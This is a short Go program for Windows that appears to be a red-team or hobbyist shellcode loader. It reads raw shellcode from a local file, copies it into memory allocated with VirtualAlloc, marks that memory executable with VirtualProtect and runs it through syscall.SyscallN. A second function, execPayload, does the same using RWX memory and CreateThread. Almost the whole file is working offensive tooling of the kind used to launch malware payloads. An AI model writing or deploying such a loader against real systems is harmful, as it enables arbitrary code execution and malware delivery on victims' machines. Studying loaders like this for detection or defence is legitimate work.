package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Execute a Windows payload
func execPayload(payload []byte) {
	const (
		MEM_COMMIT  = 0x1000
		MEM_RESERVE = 0x2000
		INFINITE    = 0xffffffff
	)

	// Allocate a RWX memory region
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	_VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	ptr, _, _ := _VirtualAlloc.Call(0, uintptr(len(payload)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)

	// Copy the payload
	_RtlMoveMemory := kernel32.MustFindProc("RtlMoveMemory")
	_RtlMoveMemory.Call(ptr, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)))

	// Execute the payload
	_CreateThread := kernel32.MustFindProc("CreateThread")
	th, _, _ := _CreateThread.Call(0, 0, ptr, 0, 0, 0)

	// Wait for the thread to finish running
	_WaitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")
	_WaitForSingleObject.Call(th, INFINITE)
}

func main() {
	fmt.Printf("hahahahahaahha\n")
	fmt.Printf("hahahahahaahha\n")
	fmt.Printf("hahahahahaahha\n")
	fmt.Printf("hahahahahaahha\n")
	fmt.Printf("hahahahahaahha\n")
	fmt.Printf("hahahahahaahha\n")
	fmt.Printf("hahahahahaahha\n")

	// pid := "1168"
	// shellcode_file := `c:\shellcode.bin`
	shellcode_file := `z:\shellcode.bin`
	// shellcode_file := `C:\\fasmw\\EXAMPLES\\HELLO\\HELLO.exe`

	// fmt.Println("Process ID: " + pid)
	fmt.Println("Shellcode file: " + shellcode_file)

	// Convert CLI argument to int
	// pid_int, _ := strconv.Atoi(pid)

	// Open given path
	f, err := os.Open(shellcode_file)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	// Get content as bytes
	shellcode, err := io.ReadAll(f)
	if err != nil {
		log.Fatal(err)
	}
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}

	time.Sleep(time.Second)
	// syscall.SyscallN(addr, 0, 0, 0, 0)
	syscall.SyscallN(addr)

	fmt.Println("Shellcode should have been executed!")
}
